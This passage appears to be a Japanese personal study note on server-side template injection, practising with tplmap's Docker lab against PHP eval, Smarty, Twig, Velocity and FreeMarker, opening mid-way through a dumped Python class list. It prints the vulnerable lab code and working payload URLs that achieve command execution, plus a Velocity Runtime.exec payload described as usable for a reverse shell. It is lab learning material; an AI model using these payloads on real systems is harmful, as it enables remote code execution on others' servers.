'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 
'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, 
<class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 
'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 
'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 
'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 
'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, 
<class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 
'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 
'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 
'_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class 
'_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class 
'_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class 
'_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, 
<class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class 
'_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class 
'_frozen_importlib_external._LoaderBasics'>, <class 
'_frozen_importlib_external.FileLoader'>, <class 
'_frozen_importlib_external._NamespacePath'>, <class 
'_frozen_importlib_external._NamespaceLoader'>, <class 
'_frozen_importlib_external.PathFinder'>, <class 
'_frozen_importlib_external.FileFinder'>, <class 'posix.ScandirIterator'>, <class 
'posix.DirEntry'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class 
'_io.IncrementalNewlineDecoder'>, <class 'zipimport.zipimporter'>, <class 
'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 
'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 
'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, 
<class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, 
<class 'collections.abc.Awaitable'>, <class 'types.GenericAlias'>, <class 
'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 
'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, 
<class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, 
<class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 
'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 
'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 
'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, 
<class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 
'types._GeneratorWrapper'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, 
<class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 
'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 'itertools.accumulate'>, 
<class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, 
<class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, 
<class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, 
<class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 
'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, 
<class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, 
<class 'itertools._grouper'>, <class 'itertools._tee'>, <class 
'itertools._tee_dataobject'>, <class 'operator.itemgetter'>, <class 
'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 
'collections.deque'>, <class '_collections._deque_iterator'>, <class 
'_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 
'collections._Link'>, <class 'functools.partial'>, <class 
'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 
'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 
're.Scanner'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 
'markupsafe._MarkupEscapeHelper'>, <class 'warnings.WarningMessage'>, <class 
'warnings.catch_warnings'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class 
'_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 
'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, 
<class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, 
<class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class 
'_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class '_random.Random'>, 
<class '_sha512.sha384'>, <class '_sha512.sha512'>, <class 'weakref.finalize._Info'>, 
<class 'weakref.finalize'>, <class 'tempfile._RandomNameSequence'>, <class 
'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 
'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class 
'_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class 
'_blake2.blake2s'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 
'_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class 
'_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, 
<class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 
'pickle._Unpickler'>, <class 'urllib.parse._ResultMixinStr'>, <class 
'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 
'_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 
'json.encoder.JSONEncoder'>, <class 'jinja2.utils.MissingType'>, <class 
'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, 
<class 'jinja2.utils.Namespace'>, <class 'jinja2.bccache.Bucket'>, <class 
'jinja2.bccache.BytecodeCache'>, <class 'jinja2.nodes.EvalContext'>, <class 
'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 
'jinja2.idtracking.Symbols'>, <class '__future__._Feature'>, <class 
'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 
'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 
'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 
'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, 
<class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 
'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'ast.AST'>, <class 
'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, 
<class 'contextlib._BaseExitStack'>, <class 'ast.NodeVisitor'>, <class 
'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 
'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 
'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 
'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 
'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, 
<class 'jinja2.loaders.BaseLoader'>, <class 'select.poll'>, <class 'select.epoll'>, 
<class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'array.array'>, 
<class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 
'datetime.tzinfo'>, <class 'dis.Bytecode'>, <class 'tokenize.Untokenizer'>, <class 
'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 
'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, 
<class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class 
'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, 
<class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 
'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 
'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class 
'werkzeug._internal._DictAccessorProperty'>, <class 'typing._Final'>, <class 
'typing._Immutable'>, <class 'typing.Generic'>, <class 'typing._TypingEmpty'>, <class 
'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, 
<class 'typing.TypedDict'>, <class 'typing.io'>, <class 'typing.re'>, <class 
'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 
'importlib.abc.ResourceReader'>, <class 'pkgutil.ImpImporter'>, <class 
'pkgutil.ImpLoader'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 
'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 
'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 
'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 
'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 
'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 
'email._parseaddr.AddrlistClass'>, <class 'email.charset.Charset'>, <class 
'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 
'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 
'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 
'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 
'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, 
<class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 
'mimetypes.MimeTypes'>, <class 'click._compat._FixupStream'>, <class 
'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 
'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 
'click.parser.Option'>, <class 'click.parser.Argument'>, <class 
'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 
'click.types.ParamType'>, <class 'click.formatting.HelpFormatter'>, <class 
'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, 
<class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, 
<class 'werkzeug.serving.BaseWSGIServer'>, <class 
'werkzeug.datastructures.ImmutableListMixin'>, <class 
'werkzeug.datastructures.ImmutableDictMixin'>, <class 
'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, 
<class 'werkzeug.datastructures._omd_bucket'>, <class 
'werkzeug.datastructures.Headers'>, <class 
'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 
'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 
'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, 
<class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 
'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 
'urllib.request.AbstractBasicAuthHandler'>, <class 
'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 
'urllib.request.ftpwrapper'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 
'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 
'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, 
<class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 
'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, 
<class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 
'werkzeug.wrappers.base_response.BaseResponse'>, <class 
'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 
'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 
'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 
'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 
'werkzeug.wrappers.cors.CORSRequestMixin'>, <class 
'werkzeug.wrappers.cors.CORSResponseMixin'>, <class 
'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 
'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 
'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 
'werkzeug.wrappers.response.ResponseStream'>, <class 
'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'http.cookiejar.Cookie'>, 
<class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 
'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 
'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 
'werkzeug.test.Client'>, <class 'subprocess.CompletedProcess'>, <class 
'subprocess.Popen'>, <class 'platform._Processor'>, <class 'uuid.UUID'>, <class 
'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 
'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 
'itsdangerous.serializer.Serializer'>, <class 
'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 
'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 
'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 
'werkzeug.local.LocalProxy'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 
'dataclasses._MISSING_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 
'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 
'dataclasses._DataclassParams'>, <class 'difflib.SequenceMatcher'>, <class 
'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 
'pprint.PrettyPrinter'>, <class 'werkzeug.routing.RuleFactory'>, <class 
'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 
'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 
'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 
'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, 
<class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 
'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 
'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 
'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 
'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 
'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, 
<class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 
'unicodedata.UCD'>]! 
```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```
- ``   
```txt

```

## tplmap (SSTI practice)
https://github.com/epinna/tplmap   
SSTI検知ツールで、各テンプレートエンジンの脆弱な環境もDockerで用意されている。   
### setup
git cloneして、`docker-envs`ディレクトリ下で`docker-compose up -d`でコンテナを全部作成・起動する。   
```txt
docker@default:~$ docker ps
CONTAINER ID        IMAGE                             COMMAND                  CREATED             STATUS              PORTS                              NAMES
73a73451642d        docker-envs_tplmap_test_php       "docker-php-entrypoi…"   About an hour ago   Up About an hour    80/tcp, 0.0.0.0:15002->15002/tcp   docker-envs_tplmap_test_php_1
7d20e65fef72        docker-envs_tplmap_test_node      "/bin/sh -c 'cd /app…"   About an hour ago   Up About an hour    0.0.0.0:15004->15004/tcp           docker-envs_tplmap_test_node_1
ff18ec4758d6        docker-envs_tplmap_test_java      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15003->15003/tcp           docker-envs_tplmap_test_java_1
d345416b4104        docker-envs_tplmap_test_python    "/bin/sh -c 'python …"   About an hour ago   Up About an hour    0.0.0.0:15001->15001/tcp           docker-envs_tplmap_test_python_1
f1a58c98075d        docker-envs_tplmap_test_python3   "/bin/sh -c 'python3…"   About an hour ago   Up About an hour    0.0.0.0:15006->15001/tcp           docker-envs_tplmap_test_python3_1
33eba77b5918        docker-envs_tplmap_test_ruby      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15005->15005/tcp           docker-envs_tplmap_test_ruby_1
docker@default:~$
```
`http://192.168.99.100:15004/ejs?inj=a`とかでアクセスできる！   
### php
#### eval
`http://192.168.99.100:15002/eval.php?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102749953-453b1a00-43a8-11eb-903a-ebbf4ce70376.png)   
evalに`?inj=`の値がそのまま代入されている。   
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

if(!$_GET["blind"]) {
  echo generateRandomString();
  error_log('DEBUG< : ' . $tpl);
  $rendered = eval($tpl);
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
else {
  error_log('DEBUG< : ' . $tpl);
  ob_start();
  $rendered = eval($tpl);
  ob_end_clean();
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
?>
```
`http://192.168.99.100:15002/eval.php?inj=system(%27id%27);`でRCE！   
![image](https://user-images.githubusercontent.com/56021519/102750083-8e8b6980-43a8-11eb-843f-b4732c36e9f3.png)   
`tpl`の`%s`を`inj`パラメータの値に置き換えるので以下でRCE！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);`   
blindにすると`id`コマンドの実行結果は見えないが、確かに実行はされている！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);&blind=1`   
![image](https://user-images.githubusercontent.com/56021519/102750650-87b12680-43a9-11eb-8a7f-b37c06c988c8.png)   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=aaa&blind=1`のようにevalの中でエラーが発生するようにすると、   
![image](https://user-images.githubusercontent.com/56021519/102750727-aadbd600-43a9-11eb-8e51-3fccd25f2ab6.png)   
#### smarty
`$smarty->fetch('string:'.$tpl);`で`?inj={*}`とすると、`$smarty->fetch('string:{*}');`となってこれがテンプレートエンジンによって解析される！ここが脆弱   
smarty-3.1.32-secured.php   
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

require('lib/smarty-3.1.29/libs/Smarty.class.php');
$smarty = new Smarty;

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

error_log('DEBUG< : ' . $tpl);
$rendered = $smarty->fetch('string:'.$tpl);
error_log('DEBUG> : ' . $rendered);

if(!$_GET["blind"]) {
  echo generateRandomString() . $rendered . generateRandomString();
}
else {
  echo generateRandomString();
}
?>
```
以下よりSmartyだと判定できるらしい。   
![image](https://user-images.githubusercontent.com/56021519/102763178-a836ac00-43bc-11eb-9a05-8f5af0aed0a7.png)   
```txt
http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=${7*7}
MOqmnDhLrj$49p5m8SkqDJo

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=a{*comment*}b
ACWPmsrhdxabaJZ9dSrkm3
```
以下で環境変数とかを表示できる。`self::`のやつはなんかうまく行ってない。   

```txt
http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$SCRIPT_NAME}
1uzWVrFehC/smarty-3.1.32-secured.phpG3rd1BP40c

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={SMARTY_DIR}
urVZfizSOI/var/www/html/lib/smarty-3.1.32/libs/nOrJdf7o4h

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$smarty.get.inj}
JoeiKYCzW5{$smarty.get.inj}5O9topPlc1

GET /smarty-3.1.32-secured.php?inj={$smarty.cookies.a} 
Cookie: a=**cookie_value**
GBf6kdYhCJ**cookie_value**2HogA4LaUw

http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self%3A%3AgetStreamVariable(%22file%3A%2F%2F%2Fproc%2Fself%2Floginuid%22)}%0D%0A
Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable("file:///proc/s..." on line 1 "{self::getStreamVariable("file:///proc/self/loginuid")}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1

http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self::getStreamVariable($SCRIPT_NAME)}
Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable($SCRIPT_NAME)}" on line 1 "{self::getStreamVariable($SCRIPT_NAME)}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1
```
以下でRCEできてる！unsecured.phpでもsecured.phpでも両方同様にRCEできてる！   
```txt
http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={system(%27id%27)}
xdeFqDKjk3uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)wG31cLv75x

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={%27****%27}
AksCy1ZQ8g****J5grndNk6e

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={}
kXunBvWJh0{}wrFURs4H6f
```
#### twig
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

require_once './lib/Twig-1.24.1/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

// Run render via CLI
if (php_sapi_name() == "cli") {
    $_GET["inj"] = '';
    $_GET["tpl"] = "";
} 

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

error_log('DEBUG: ' . $tpl);

$loader = new Twig_Loader_Array(array(
    'tpl' => $tpl,
));
$twig = new Twig_Environment($loader);

echo generateRandomString() . $twig->render('tpl') . generateRandomString();
 ?>
 ```
以下でTwigとわかる。   
```txt
http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=*
Zrqshc5ipK*0ZtRqxO5nV

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=${7*7}
VqA0Fza9sE${7*7}fVCkzjUw3r

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*7}}
eETDOLZaXq4948ghPHSBZC

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*%277%27}}
KNXoxPeU3v49Tj3nD2FSaB
```
以下は全部うまく行ってないな…。   
```txt
http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{system(%27id%27)}}
Fatal error: Uncaught Twig_Error_Syntax: The function "system" does not exist in "tpl" at line 1 in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php:572 Stack trace: #0 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(351): Twig_ExpressionParser->getFunctionNodeClass('system', 1) #1 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(144): Twig_ExpressionParser->getFunctionNode('system', 1) #2 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(84): Twig_ExpressionParser->parsePrimaryExpression() #3 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(41): Twig_ExpressionParser->getPrimary() #4 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(141): Twig_ExpressionParser->parseExpression() #5 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(95): Twig_Parser->subparse(NULL, false) #6 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(544): Twig_Parser->parse(Object(Twig_TokenStream)) #7 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(596): Twig_Environment->parse(Obj in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php on line 572

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.registerUndefinedFilterCallback(%22exec%22)}}
bmlikECRBNJAUrW3Sm5k

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.getFilter(%22id%22)}}
UtRvAOJ2Ww2XWUpgIfMa

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.setCache(%22http://127.0.0.1:9500%22)}}
ouc3MNd81U9v7WqfaxuT
```
以下でRCEできたー！`eval`だとなんかダメだった。   
```txt
/twig-1.19.0-unsecured.php?inj={{_self.env.registerUndefinedFilterCallback(%22system%22)}}{{_self.env.getFilter(%22id%22)}}
fGNvg4mElu"uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)"2ioR6Zpqxg
```
### Java
#### velocity
`velocity.evaluate( context, w, "mystring", tpl );`の第4引数`tpl`にテンプレートを入力。   
```java
public static Object velocity(Request request, Response response) {


  // Get inj parameter, exit if none
  String inj = request.queryParams("inj");
  if(inj == null) {
    return "";
  }

  // Get tpl parameter
  String tpl = request.queryParams("tpl");
  if(tpl == null) {
    tpl = inj;
  }
  else {
    // Keep the formatting a-la-python
    tpl = tpl.replace("%s", inj);
  }
  
  String blind = request.queryParams("blind");

  LogChute velocityLogChute = new NullLogChute() ;
  VelocityEngine velocity;
  StringWriter w;
  try{
    velocity = new VelocityEngine() ;
    // Turn off logging - catch exceptions and log ourselves
    velocity.setProperty(RuntimeConstants.RUNTIME_LOG_LOGSYSTEM, velocityLogChute) ;
    velocity.setProperty(RuntimeConstants.INPUT_ENCODING, "UTF-8") ;
    velocity.init() ;

    VelocityContext context = new VelocityContext();
    w = new StringWriter();

    velocity.evaluate( context, w, "mystring", tpl );


  }catch(Exception e){
    e.printStackTrace();
    return "";
  }

  // Return out string if not blind
  if(blind == null){
    return UUID.randomUUID().toString() + w.toString() + UUID.randomUUID().toString();
  }
  else {
    return UUID.randomUUID().toString();
  }
}
```
以下だとどれも成功しないのでフローチャートに従えば`not vulnerable`となるが…。   
```txt
http://192.168.99.100:15003/velocity?inj=*
90c94e24-7577-4c67-8c3d-0375421243ee*d28b750b-7272-40db-a44c-1ee8036ce26f

http://192.168.99.100:15003/velocity?inj=${7*7}
d8337a02-26e6-4e13-844e-2183bb404981${7*7}a58f904b-a8f3-4962-96b4-6433624f1fc3

http://192.168.99.100:15003/velocity?inj={{7*7}}
c7afdf02-9829-4da6-ae80-fe2a914af8ae{{7*7}}3d299313-456d-40ca-b9bb-ccaf03f22db6
```
以下を送信するとSymantecが`Java Payload attack`を検出しちゃってDockerでは試せない…。   
```txt
192.168.99.100:15003/velocity?inj=$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
```
以下でReverse shellできうるとからしい   
```python
payload ='''
#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {eval,$({tr,/+,_-}<<<%s|{base64,--decode})}"))
#set($null=$proc.waitFor())
${null}
'''%base64.b64encode("sleep 5")
```
#### freemarker
`template = new Template("name", new StringReader(tpl),  new Configuration());`で解析してる？？`StringReader()`の中にテンプレートを入れれば良さそう。   
```java
public static Object freemarker(Request request, Response response) {

  // Get inj parameter, exit if none
  String inj = request.queryParams("inj");
  if(inj == null) {
    return "";
  }

  // Get tpl parameter
  String tpl = request.queryParams("tpl");
  if(tpl == null) {
    tpl = inj;
  }
  else {
    // Keep the formatting a-la-python
    tpl = tpl.replace("%s", inj);
  }

  // Get blind parameter
  String blind = request.queryParams("blind");

  // Generate template from "inj"
  Template template;
  try{
    template = new Template("name", new StringReader(tpl),  new Configuration());
  }catch(IOException e){
    e.printStackTrace();
    return "";
  }

  // Write processed template to out
  HashMap data = new HashMap();
  StringWriter out = new StringWriter();
  try{
    template.process(data, out);
  }catch(TemplateException | IOException e){
    e.printStackTrace();
    return "";
  }

  // Return out string if not blind
  if(blind == null){
    return UUID.randomUUID().toString() + out.toString() + UUID.randomUUID().toString();
  }
  else {
    return UUID.randomUUID().toString();
  }
}
```
以下より、チャート的にはMakoということになるが…。   
```txt
http://192.168.99.100:15003/freemarker?inj=*
3f82c00c-5a47-4dc1-bf77-c7728cbfdf31*5d62471d-c8f5-42ae-8aec-49414b00d13a

http://192.168.99.100:15003/freemarker?inj=${7*7}
be77fc54-fc2a-4829-b3c9-9511bc760b92496f88d221-1075-4e11-bf87-af0237c95883

http://192.168.99.100:15003/freemarker?inj=aaaa{*comment*}bbb
